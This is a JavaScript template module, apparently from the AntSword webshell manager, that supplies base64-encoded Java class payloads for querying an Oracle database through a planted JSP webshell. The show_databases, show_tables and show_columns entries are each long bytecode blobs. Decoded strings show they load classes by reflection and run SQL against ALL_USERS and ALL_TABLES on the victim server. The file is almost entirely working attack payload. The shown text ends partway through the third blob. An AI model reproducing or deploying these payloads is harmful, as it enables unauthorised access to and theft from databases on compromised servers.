//
// oracle 模板
//
// @params
// :encode  SHELL编码
// :conn    数据库连接字符串
// :sql     执行SQL语句
// :db      数据库名
// :table   表名

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
    show_databases: {
      _: 'yv66vgAAADEBKwoACQB9CQBhAH4JAGEAfwgAgAoABwCBCACCBwCDCgAHAIQHAIUKAIYAhwcAiAgAiQcAigcAiwoACQCMCABiCgAHAI0KAI4AjwoAjgCQCABkCACRCQBhAJIIAJMJAGEAlAgAlQkAYQCWBwCXCACYCgAbAJkIAJoIAJsIAJwIAJ0IAJ4IAJ8LAA0AoAsACwChCwANAKELAAsAogoAYQCjCQBhAKQKAGEApQoAGwCmBwCnCgAsAH0IAKgKACwAqQoADgCqCgAsAKoLAA0AqwoAGwCqCgBhAKwKAK0ArgoArwCwCgA5ALEKADkAsgcAswoAYQC0CgA5ALUKADkAtggAtwgAuAoAOQC5CgA5ALoKALsAvAsAvQC+CwC/AMALAMEAwgsAwwDECwDDAMULAMEAxgsAwQDHCADICADJCgBhAMoHAMsIAMwHAM0JAK8AzgoAhgCPCgAHAM8KAK8A0AoABwDRCgDSANMKAAkAqggA1AoA1QDWCADXCgA5ANgIANkIANoKAAcA2wgAcQgA3AgA3QoABwDeBwDfAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEADXNob3dEYXRhYmFzZXMBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABNTaG93X2RhdGFiYXNlcy5qYXZhDABrAGwMAGIAYwwAZABlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAOAA4QEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAOIA4wEAEGphdmEvbGFuZy9PYmplY3QHAOQMAOUA5gEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA5wDoDADpAOoHAOsMAOwA7QwA7gDvAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAGkAZwEABmJhc2U2NAwAZgBnAQAPYW50c3dvcmRDaGFyc2V0DABoAGcBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABrAPABAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEAEmFudHN3b3JkYXJnZGVjb2RlcgEACXRleHQvaHRtbAwA8QDwDADyAPAMAPMAcgwAcQByDABqAGcMAHYAdwwA9AD1AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAlFUlJPUjovLyAMAPQA9gwA9wD4DAD5APoMAHgAcgcA+wwA/ADwBwD9DAD+AP8MAQABAQwAbwBwAQAQamF2YS9sYW5nL1N0cmluZwwAeQB6DABrAQIMAQMA+AEAAg0KAQABCgwBBAEFDAEGAQcHAQgMAQkBCgcBCwwBDAENBwEODAEPARAHAREMARIBEwcBFAwBFQEWDAEXAQEMARgBGQwBGgEBAQApU0VMRUNUIFVTRVJOQU1FIEZST00gQUxMX1VTRVJTIE9SREVSIEJZIDEBAAEJDAB0AHUBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAAltCDAEbARwMAR0BHgwBHwEgDAEhASIHASMMASQBJQEADGphdmEudmVyc2lvbgcBJgwBJwByAQADMS45DAEoAP8BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwBKQDjAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBJAEqAQAeZGF0YWJhc2Uvb3JhY2xlL1Nob3dfZGF0YWJhc2VzAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEdHJpbQEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAWamF2YS9zcWwvRHJpdmVyTWFuYWdlcgEADWdldENvbm5lY3Rpb24BAE0oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9Db25uZWN0aW9uOwEAE2phdmEvc3FsL0Nvbm5lY3Rpb24BAA9jcmVhdGVTdGF0ZW1lbnQBABYoKUxqYXZhL3NxbC9TdGF0ZW1lbnQ7AQASamF2YS9zcWwvU3RhdGVtZW50AQAMZXhlY3V0ZVF1ZXJ5AQAoKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0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',
      [arg1]: '#{newbase64::encode}',
      [arg2]: '#{newbase64::conn}'
    },
    show_tables: {
      _: 'yv66vgAAADEBLwoACQB/CQBjAIAJAGMAgQgAggoABwCDCACEBwCFCgAHAIYHAIcKAIgAiQcAiggAiwcAjAcAjQoACQCOCABkCgAHAI8KAJAAkQoAkACSCABmCACTCQBjAJQIAJUJAGMAlggAlwkAYwCYBwCZCACaCgAbAJsIAJwIAJ0IAJ4IAJ8IAKAIAKEIAKILAA0AowsACwCkCwANAKQLAAsApQoAYwCmCQBjAKcKAGMAqAoAGwCpBwCqCgAtAH8IAKsKAC0ArAoADgCtCgAtAK0LAA0ArgoAGwCtCgBjAK8KALAAsQoAsgCzCgA6ALQKADoAtQcAtgoAYwC3CgA6ALgKADoAuQgAuggAuwoAOgC8CgA6AL0KAL4AvwsAwADBCwDCAMMLAMQAxQsAxgDHCwDGAMgLAMQAyQsAxADKCADLCADMCADNCgBjAM4HAM8IANAHANEJALIA0goAiACRCgAHANMKALIA1AoABwDVCgDWANcKAAkArQgA2AoA2QDaCADbCgA6ANwIAN0IAN4KAAcA3wgAcwgA4AgA4QoABwDiBwDjAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEACnNob3dUYWJsZXMBAEooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBABBTaG93X3RhYmxlcy5qYXZhDABtAG4MAGQAZQwAZgBnAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAOQA5QEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMAOYA5wEAEGphdmEvbGFuZy9PYmplY3QHAOgMAOkA6gEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAtnZXRSZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA6wDsDADtAO4HAO8MAPAA8QwA8gDzAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAGsAaQEABmJhc2U2NAwAaABpAQAPYW50c3dvcmRDaGFyc2V0DABqAGkBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAADABtAPQBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADWFudHN3b3JkYXJnZGIBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPUA9AwA9gD0DAD3AHQMAHMAdAwAbABpDAB4AHkMAPgA+QEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAJRVJST1I6Ly8gDAD4APoMAPsA/AwA/QD+DAB6AHQHAP8MAQAA9AcBAQwBAgEDDAEEAQUMAHEAcgEAEGphdmEvbGFuZy9TdHJpbmcMAHsAfAwAbQEGDAEHAPwBAAINCgEAAQoMAQgBCQwBCgELBwEMDAENAQ4HAQ8MARABEQcBEgwBEwEUBwEVDAEWARcHARgMARkBGgwBGwEFDAEcAR0MAR4BBQEAR1NFTEVDVCBUQUJMRV9OQU1FIEZST00gKFNFTEVDVCBUQUJMRV9OQU1FIEZST00gQUxMX1RBQkxFUyBXSEVSRSBPV05FUj0nAQANJyBPUkRFUiBCWSAxKQEAAQkMAHYAdwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQACW0IMAR8BIAwBIQEiDAEjASQMASUBJgcBJwwBKAEpAQAMamF2YS52ZXJzaW9uBwEqDAErAHQBAAMxLjkMASwBAwEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyDAEtAOcBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAEoAS4BABtkYXRhYmFzZS9vcmFjbGUvU2hvd190YWJsZXMBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAR0cmltAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEATShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAxleGVjdXRlUXVlcnkBACgoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9SZXN1bHRTZXQ7AQASamF2YS9zcWwvUmVzdWx0U2V0AQALZ2V0TWV0YURhdGEBAB4oKUxqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YTsBABpqYXZhL3NxbC9SZXN1bHRTZXRNZXRhRGF0YQEADmdldENvbHVtbkNvdW50AQADKClJAQANZ2V0Q29sdW1uTmFtZQEABG5leHQBAAMoKVoBAAlnZXRTdHJpbmcBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29u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',
      [arg1]: '#{newbase64::encode}',
      [arg2]: '#{newbase64::conn}',
      [arg3]: '#{newbase64::db}'
    },
    show_columns: {
      _: 'yv66vgAAADEBMwoACQCBCQBlAIIJAGUAgwgAhAoABwCFCACGBwCHCgAHAIgHAIkKAIoAiwcAjAgAjQcAjgcAjwoACQCQCABmCgAHAJEKAJIAkwoAkgCUCABoCACVCQBlAJYIAJcJAGUAmAgAmQkAZQCaBwCbCACcCgAbAJ0IAJ4IAJ8IAKAIAKEIAKIIAKMIAKQIAKULAA0ApgsACwCnCwANAKcLAAsAqAoAZQCpCQBlAKoKAGUAqwoAGwCsBwCtCgAuAIEIAK4KAC4ArwoADgCwCgAuALALAA0AsQoAGwCwCgBlALIKALMAtAoAtQC2CgA7ALcKADsAuAcAuQoAZQC6CgA7ALsKADsAvAgAvQgAvgoAOwC/CgA7AMAKAMEAwgsAwwDECwDFAMYLAMcAyAsAyQDKCwDJAMsLAMcAzAsAxwDNCADOCADPCADQCADRCgBlANIHANMIANQHANUJALUA1goAigCTCgAHANcKALUA2AoABwDZCgDaANsKAAkAsAgA3AoA3QDeCADfCgA7AOAIAOEIAOIKAAcA4wgAdQgA5AgA5QoABwDmBwDnAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3Bvb